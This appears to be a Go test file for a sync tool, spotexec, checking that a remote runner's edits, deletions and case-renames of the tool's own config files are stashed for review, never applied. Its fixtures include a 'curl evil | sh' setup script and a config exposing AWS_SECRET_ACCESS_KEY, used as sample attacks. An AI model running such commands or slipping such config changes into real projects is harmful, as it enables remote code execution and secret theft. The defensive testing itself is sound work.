package client

import (
	"context"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/daintreehq/spotexec/internal/fsid"
	"github.com/daintreehq/spotexec/internal/protocol"
)

// A runner's edits to spotexec's own config are never applied: the local
// file stays as it was (or absent), and the runner's version is stashed for
// review.
func TestWritebackHoldsSpotexecConfig(t *testing.T) {
	for _, git := range []bool{false, true} {
		t.Run(map[bool]string{false: "directory", true: "git"}[git], func(t *testing.T) {
			committed := map[string]string{".spotexec.toml": "[sync]\n", ".spotexec/Dockerfile": "FROM a\n", "a.txt": "a\n"}
			f := newWBFixture(t, git, committed, nil)
			root := f.ws.Root
			uploadedToo(t, f, ".spotexec/Dockerfile") // project files under .spotexec/ sync
			evil := "[sync]\nenv_allow = [\"AWS_SECRET_ACCESS_KEY\"]\n"
			writes := map[string]string{
				".spotexec.toml":        evil,
				".spotexec/Dockerfile":  "FROM evil\n",
				".spotexec/setup.sh":    "curl evil | sh\n",
				"sub/.spotexec.toml":    evil,
				"deep/x/.SpotExec.TOML": evil,
				".spotexecignore":       "*\n",
				"a.txt":                 "b\n",
			}
			wb := f.apply(t, nil, writes)
			if got := readOr(filepath.Join(root, ".spotexec.toml")); got != "[sync]\n" {
				t.Errorf(".spotexec.toml = %q, want the local version kept", got)
			}
			if got := readOr(filepath.Join(root, ".spotexec", "Dockerfile")); got != "FROM a\n" {
				t.Errorf(".spotexec/Dockerfile = %q, want the local version kept", got)
			}
			for _, p := range []string{".spotexec/setup.sh", "sub/.spotexec.toml", "deep/x/.SpotExec.TOML", ".spotexecignore"} {
				if _, err := os.Lstat(filepath.Join(root, filepath.FromSlash(p))); err == nil {
					t.Errorf("%s was created from the runner's version", p)
				}
			}
			if got := readOr(filepath.Join(root, "a.txt")); got != "b\n" {
				t.Errorf("a.txt = %q, want the runner's version applied", got)
			}
			var held []string
			for _, c := range wb.Stashed {
				if c.Reason != ReasonSpotexecConfig {
					t.Errorf("%s stashed with reason %q", c.Path, c.Reason)
				}
				if got := readOr(c.Remote); got != writes[c.Path] {
					t.Errorf("%s: stashed %q, want the runner's version", c.Path, got)
				}
				held = append(held, c.Path)
			}
			sort.Strings(held)
			want := ".spotexec.toml,.spotexec/Dockerfile,.spotexec/setup.sh,.spotexecignore,deep/x/.SpotExec.TOML,sub/.spotexec.toml"
			if got := strings.Join(held, ","); got != want {
				t.Errorf("held %s, want %s", got, want)
			}
			if got := strings.Join(wb.Applied, ","); got != "a.txt" {
				t.Errorf("applied %s, want a.txt", got)
			}
		})
	}
}

// Deleting spotexec's own config is never applied either, committed or
// not, at any depth; the deletion is stashed as a marker, and counts as a
// conflict rather than a mass-deletion hold.
func TestWritebackHoldsSpotexecConfigDeletion(t *testing.T) {
	f := newWBFixture(t, true, map[string]string{
		".spotexec.toml": "[sync]\n", ".gitignore": "x\n", "sub/.gitignore": "y\n", "sub/.spotexec.toml": "[sync]\n",
		".spotexecignore": ".env\n", ".spotexec/Dockerfile": "FROM a\n",
		"a": "a", "b": "b", "c": "c", "d": "d", "e": "e", "f": "f",
	}, nil)
	uploadedToo(t, f, ".spotexec/Dockerfile")
	wb := f.apply(t, []string{".spotexec.toml", "sub/.spotexec.toml", ".spotexecignore", ".spotexec/Dockerfile", ".gitignore", "sub/.gitignore", "a"}, nil)
	for _, p := range []string{".spotexec.toml", "sub/.spotexec.toml", ".spotexecignore", ".spotexec/Dockerfile", ".gitignore"} {
		if _, err := os.Lstat(filepath.Join(f.ws.Root, filepath.FromSlash(p))); err != nil {
			t.Errorf("%s was deleted: %v", p, err)
		}
	}
	if got := strings.Join(wb.Held, ","); got != ".gitignore" {
		t.Errorf("held %q, want .gitignore", got)
	}
	if got := strings.Join(wb.Deleted, ","); got != "sub/.gitignore,a" {
		t.Errorf("deleted %q", got)
	}
	var stashed []string
	for _, c := range wb.Stashed {
		if c.Reason != ReasonSpotexecConfig || !c.Deleted {
			t.Errorf("%s: reason %q, deleted %v", c.Path, c.Reason, c.Deleted)
		}
		stashed = append(stashed, c.Path)
	}
	sort.Strings(stashed)
	if got := strings.Join(stashed, ","); got != ".spotexec.toml,.spotexec/Dockerfile,.spotexecignore,sub/.spotexec.toml" {
		t.Errorf("stashed %s", got)
	}
	if len(wb.Conflicts) != 4 {
		t.Errorf("conflicts %v, want the 4 config deletions", wb.Conflicts)
	}
}

// A config path the run left as it is here is no conflict.
func TestWritebackSpotexecConfigNoOps(t *testing.T) {
	f := newWBFixture(t, false, map[string]string{".spotexec.toml": "[sync]\n"}, nil)
	writeFile(t, f.ws.Root, "sub/.spotexec.toml", "same\n") // made here during the run too
	wb := f.apply(t, []string{"gone/.spotexecignore"}, map[string]string{".spotexec.toml": "[sync]\n", "sub/.spotexec.toml": "same\n"})
	if len(wb.Stashed) != 0 || len(wb.Applied) != 0 {
		t.Errorf("stashed %v, applied %v", wb.Stashed, wb.Applied)
	}
}

// A case-only rename of a config file renames nothing: the local name and
// content stay, and the runner's side is stashed.
func TestWritebackHoldsSpotexecConfigCaseRename(t *testing.T) {
	f := newWBFixture(t, false, map[string]string{".spotexec.toml": "[sync]\n", "a.txt": "a\n"}, nil)
	wb := f.apply(t, []string{".spotexec.toml"}, map[string]string{".SpotExec.toml": "[sync]\nenv_allow = [\"X\"]\n"})
	if got := readOr(filepath.Join(f.ws.Root, ".spotexec.toml")); got != "[sync]\n" {
		t.Errorf(".spotexec.toml = %q", got)
	}
	names, err := os.ReadDir(f.ws.Root)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range names {
		if e.Name() == ".SpotExec.toml" {
			t.Errorf("renamed to %s", e.Name())
		}
	}
	if len(wb.Applied)+len(wb.Deleted) != 0 {
		t.Errorf("applied %v, deleted %v", wb.Applied, wb.Deleted)
	}
	if len(wb.Stashed) == 0 {
		t.Error("nothing stashed")
	}
	for _, c := range wb.Stashed {
		if c.Reason != ReasonSpotexecConfig {
			t.Errorf("%s: reason %q", c.Path, c.Reason)
		}
	}
}

// Content a run wrote into config is stashed, not written, so it doesn't
// make deleting a file with the same content look like a move.
func TestWritebackConfigIsNoMoveTarget(t *testing.T) {
	committed := map[string]string{}
	for _, p := range []string{"a", "b", "c", "d", "e", "f"} {
		committed[p] = "secret " + p + "\n"
	}
	f := newWBFixture(t, false, nil, committed)
	writes := map[string]string{}
	for _, p := range []string{"a", "b", "c", "d", "e"} {
		writes[".spotexec/"+p] = committed[p]
	}
	wb := f.apply(t, []string{"a", "b", "c", "d", "e"}, writes)
	if len(wb.Deleted) != 0 || len(wb.Held) != 5 {
		t.Errorf("deleted %v, held %v: want the mass deletion held", wb.Deleted, wb.Held)
	}
}

func TestSpotexecConfigConflictsAreReported(t *testing.T) {
	rec := &recordingReporter{}
	reportConflicts(rec, []Conflict{
		{Path: ".spotexec.toml", Local: "/w/.spotexec.toml", Remote: "/g/c/r/.spotexec.toml", Reason: ReasonSpotexecConfig},
		{Path: ".spotexecignore", Local: "/w/.spotexecignore", Remote: "/g/c/r/.spotexecignore.deleted", Deleted: true, Reason: ReasonSpotexecConfig},
	}, "r")
	if len(rec.warnings) != 2 || len(rec.events) != 2 {
		t.Fatalf("warnings %v, events %v", rec.warnings, rec.events)
	}
	for i, w := range rec.warnings {
		if !strings.HasPrefix(w, "WRITEBACK_CONFIG: ") || strings.Contains(w, "changed locally") {
			t.Errorf("warning %q", w)
		}
		if rec.events[i]["reason"] != ReasonSpotexecConfig {
			t.Errorf("event %v", rec.events[i])
		}
	}
	if !strings.Contains(rec.warnings[0], rec.events[0]["diff"].(string)) {
		t.Errorf("warning without its diff command: %s", rec.warnings[0])
	}
}

// pull never writes spotexec's config into the worktree: not when it is
// gitignored here, and not when write-back held it as a new file.
func TestPullRefusesSpotexecConfig(t *testing.T) {
	dir := gitRepo(t, map[string]string{"src/a.go": "package a\n", ".gitignore": "out/\n.spotexec.toml\n"})
	ws := &Workspace{Root: dir, Git: true, GitDir: filepath.Join(dir, ".git")}
	slot := map[string]string{".spotexec.toml": "evil\n", "sub/.spotexec.toml": "evil\n", "out/.spotexec/setup.sh": "evil\n", "out/r.txt": "ok\n"}
	listed := []string{".spotexec.toml", "sub/.spotexec.toml", "out/.spotexec/setup.sh", "out/r.txt"}
	held := HeldFiles{"sub/.spotexec.toml": entry("sub/.spotexec.toml", "evil\n")}
	for _, heldOnly := range []bool{false, true} {
		n, err := applyPull(context.Background(), ws, dir, []string{"**"}, held, heldOnly, listed, tarOf(t, slot), &recordingReporter{}, "")
		if err != nil {
			t.Fatal(err)
		}
		if want := map[bool]int{false: 1, true: 0}[heldOnly]; n != want {
			t.Errorf("heldOnly %v: pulled %d, want %d", heldOnly, n, want)
		}
	}
	for _, p := range []string{".spotexec.toml", "sub/.spotexec.toml", "out/.spotexec/setup.sh"} {
		if _, err := os.Lstat(filepath.Join(dir, filepath.FromSlash(p))); err == nil {
			t.Errorf("pulled %s", p)
		}
	}
	if got := readOr(filepath.Join(dir, "out", "r.txt")); got != "ok\n" {
		t.Errorf("out/r.txt = %q", got)
	}
}

// uploadedToo adds root/p, which newWBFixture leaves out, to the manifest.
func uploadedToo(t *testing.T, f wbFixture, p string) {
	t.Helper()
	id, mode, size, err := fsid.Path(filepath.Join(f.ws.Root, filepath.FromSlash(p)))
	if err != nil {
		t.Fatal(err)
	}
	e := protocol.Entry{Path: p, ID: id, Mode: mode, Size: size}
	f.m.Entries = append(f.m.Entries, e)
	f.m.ByPath[p] = e
}
